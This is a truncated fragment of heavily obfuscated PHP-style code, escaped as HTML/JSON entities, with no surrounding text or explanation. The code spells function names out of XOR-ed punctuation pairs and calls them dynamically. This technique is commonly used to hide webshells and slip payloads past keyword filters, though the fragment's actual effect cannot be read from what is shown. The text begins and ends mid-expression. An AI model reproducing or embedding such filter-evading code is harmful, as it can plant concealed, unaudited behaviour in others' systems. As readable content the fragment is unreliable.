#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;)))).((\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),((\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).\u0026#39;:\u0026#39;.(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))).(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))),(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))?((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;